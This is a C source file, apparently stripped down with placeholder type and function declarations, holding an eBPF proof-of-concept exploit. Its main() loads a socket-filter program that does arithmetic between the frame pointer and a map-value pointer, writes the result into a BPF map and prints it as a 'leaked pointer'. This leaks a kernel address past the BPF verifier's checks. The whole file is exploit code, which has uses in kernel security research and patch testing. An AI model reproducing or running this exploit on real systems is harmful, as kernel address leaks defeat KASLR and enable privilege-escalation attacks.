
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct bpf_insn {int dummy; } ;


 int ARRSIZE (struct bpf_insn*) ;
 int BPF_ADD ;
 struct bpf_insn BPF_ALU64_IMM (int ,int ,int) ;
 struct bpf_insn BPF_ALU64_REG (int ,int ,int ) ;
 int BPF_DW ;
 struct bpf_insn BPF_EMIT_CALL (int ) ;
 struct bpf_insn BPF_EXIT_INSN () ;
 int BPF_FUNC_map_lookup_elem ;
 struct bpf_insn BPF_JMP_IMM (int ,int ,int ,int) ;
 int BPF_JNE ;
 struct bpf_insn BPF_LD_MAP_FD (int ,int) ;
 struct bpf_insn BPF_MOV64_IMM (int ,int ) ;
 struct bpf_insn BPF_MOV64_REG (int ,int ) ;
 int BPF_REG_0 ;
 int BPF_REG_9 ;
 int BPF_REG_ARG1 ;
 int BPF_REG_ARG2 ;
 int BPF_REG_FP ;
 struct bpf_insn BPF_STX_MEM (int ,int ,int ,int ) ;
 struct bpf_insn BPF_ST_MEM (int ,int ,int ,int) ;
 int BPF_SUB ;
 int BPF_W ;
 int array_create (int,int) ;
 int array_get_dw (int,int ) ;
 int create_filtered_socket_fd (struct bpf_insn*,int ) ;
 int printf (char*,int ) ;
 int trigger_proc (int) ;

int main(void) {
  int small_map = array_create(8, 1);
  struct bpf_insn insns[] = {

    BPF_LD_MAP_FD(BPF_REG_ARG1, small_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 9),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),


    BPF_MOV64_REG(BPF_REG_9, BPF_REG_FP),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_0),


    BPF_LD_MAP_FD(BPF_REG_ARG1, small_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, 0),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  int sock_fd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  trigger_proc(sock_fd);
  printf("leaked pointer: 0x%lx\n", array_get_dw(small_map, 0));
}
